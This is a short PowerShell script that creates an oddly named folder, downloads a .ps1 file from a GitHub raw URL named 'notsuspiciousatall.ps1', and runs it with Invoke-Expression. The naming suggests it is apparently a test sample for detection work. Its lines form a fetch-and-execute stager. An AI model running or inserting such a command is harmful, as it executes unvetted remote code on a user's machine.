mkdir "C:\gfhdf4536fghf"
$url = "https://raw.githubusercontent.com/awalhelm/fakesuspiciousscript/main/notsuspiciousatall.ps1"
$output = "c:\gfhdf4536fghf\notsuspiciousatall.ps1"
Invoke-WebRequest -Uri $url -OutFile $output

Invoke-Expression -Command $output
